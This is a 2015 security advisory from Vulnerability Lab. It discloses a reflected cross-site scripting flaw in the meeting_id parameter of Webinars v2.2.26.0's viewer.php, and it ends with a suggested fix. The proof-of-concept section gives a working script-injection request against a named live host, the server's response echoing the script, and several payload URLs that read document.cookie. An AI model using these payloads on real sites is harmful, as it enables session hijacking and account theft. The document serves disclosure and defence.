

Document Title:
===============
Webinars v2.2.26.0 - Client Side Cross Site Vulnerability


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1412


Release Date:
=============
2015-01-19


Vulnerability Laboratory ID (VL-ID):
====================================
1412


Common Vulnerability Scoring System:
====================================
2.4


Product & Service Introduction:
===============================
http://www.webinars.com


Abstract Advisory Information:
==============================
An independent vulnerability laboratory researcher discovered a client-side cross site scripting web vulnerability in the Webinars v2.2.26.0 conference web-application.


Vulnerability Disclosure Timeline:
==================================
2015-01-19:	Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================

Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
A client-side cross site scripting vulnerability has been discovered in the official InterCall Webinar v2.2.26.0 conference web-application.
The vulnerability allows remote attackers to hijack website customer, moderator or admin session data by client-side cross site requests.

The vulnerability is located in the `meeting_id` value of the `viewer.php` file. Remote attackers are able to inject malicious script codes to 
client-side web-application requests. Remote attackers uses a validation error in the viewer.php file to execute client-side script code in the 
webinar web-application context. The client-side script code execution occurs in the same file after a site refresh. The attack vector is located 
on the client-side of the service and the request method to inject the script code is `GET`.

The security risk of the non-persistent input validation web vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 2.4.
Exploitation of the client-side remote vulnerability requires low or medium user interaction and no privileged application user account. Successful exploitation 
results in client-side account theft by hijacking, client-side phishing, client-side external redirects and client-side manipulation of affected and connected 
module web context.

Vulnerable Service(s):
                          [+] Webinars

Vulnerable File(s):
                          [+] viewer.php

Vulnerable Parameter(s):
                          [+] meeting_id


Proof of Concept (PoC):
=======================
The client-side cross site scripting web vulnerability can be exploited by remote attackers without privileged applicaiton user account and low or medium user interaction.
For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.


--- PoC Session Logs [GET] ---
GET /viewer.php?meeting_id=%22%3E%27%3E%3CSCRIPT%3Ealert(document.cookie)%3C/SCRIPT%3E HTTP/1.1
Host: webinars.snm.org
-
User-Agent: Mozilla/5.0 (Windows NT 5.2; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
-
HTTP/1.1 200 OK
Date: Fri, 16 Jan 2015 18:10:12 GMT
Server: Apache/2.2.3 (CentOS)
X-Powered-By: PHP/5.1.6
Content-Length: 3044
Connection: close
Content-Type: text/html; charset=UTF-8


PoC: Webinar

<body >
<div id='message_box' class='message' style='visibility:hidden'>
<div class='box_header'><a onclick="ShowMessage(false, ''); return false;" href='javascript:void(0)'>
[ X ]</a></div>
<p id='message_text'>
</p>
</div>
<div id='page_box' class='page' style='visibility:hidden'>
<div class='box_header'><a onclick="ShowPageBox(false); return false;" href='javascript:void(0)'>
[ X ]</a></div>
<iframe id='page_content' src=''></iframe>

</div>
<div id='sharing_box' class='page' style='visibility:hidden'>
<div class='box_header'><a onclick="ShowSharingBox(false); return false;" href='javascript:void(0)'>
[ X ]</a></div>
<iframe id='sharing_content' src=''></iframe>[CLIENT-SIDE SCRIPT CODE EXECUTION!]
</div>
<div id="flashcontent">
	<object id="viewer" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="100%" height="100%">
		<param name="flashvars" value="MeetingServer=http://meetingengine.glcollaboration.com/wc2_22260/api.php&MeetingID=">'><SCRIPT>alert('samir')</SCRIPT>&HasFSCommand=1&UrlTarget=_self&2142738052" />
		<param name="movie" value="viewer.swf?1719627766" />
		<param name="swliveconnect" value="true" />
		<param name="wmode" value="opaque" />
		<param name="allowScriptAccess" value="always" />
		<param name="allowFullScreen" value="true" />
		
		<object data="viewer.swf?1719627766" flashvars="MeetingServer=http://meetingengine.glcollaboration.com/wc2_22260/api.php&MeetingID=">'><SCRIPT>alert('samir')</SCRIPT>&HasFSCommand=1&UrlTarget=_self&2142738052" width="100%" height="100%"
			swliveconnect=true name="viewer" wmode="opaque" allowFullScreen="true" allowScriptAccess="always"
			type="application/x-shockwave-flash">
			<div class="noflash">
				<p>You need the latest version of the Adobe Flash Player.<p/>
				<p><a target=_blank href="https://www.adobe.com/go/getflashplayer"><img src="https://www.adobe.com/images/shared/download_buttons/get_flash_player.gif" alt="Get Adobe Flash player" /></a></p>
			</div>
		
		</object>
	
	</object>
</div>
</body>


Reference(s):
http://localhost:80/viewer.php?meeting_id=">'><SCRIPT>alert('samir')</SCRIPT>
http://www.xxx.com/meet/viewer.php?meeting_id=">'><SCRIPT>alert('samir')</SCRIPT>
http://webinar.xxx.com/viewer.php?meeting_id=">'><SCRIPT>alert('samir')</SCRIPT>
http://webinars.xxx.com/viewer.php?meeting_id=">'><SCRIPT>alert('samir')</SCRIPT> 


Solution - Fix & Patch:
=======================
The vulnerability can be patched by a secure parse and encode of the vulnerable `meeting_id` value in the viewer.php file. 
Restrict the input and disallow special chars and parse the output to prevent an execution of client-side injected script codes.


Security Risk:
==============
The security risk of the client-side cross site scripting web vulnerability in the webinar conference application is estimated as medium. (CVSS 2.4)


Credits & Authors:
==================
Hadji Samir s-dz@hotmail.fr


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
policies, deface websites, hack into databases or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com
Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
(admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.

				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™


 		 	   		  
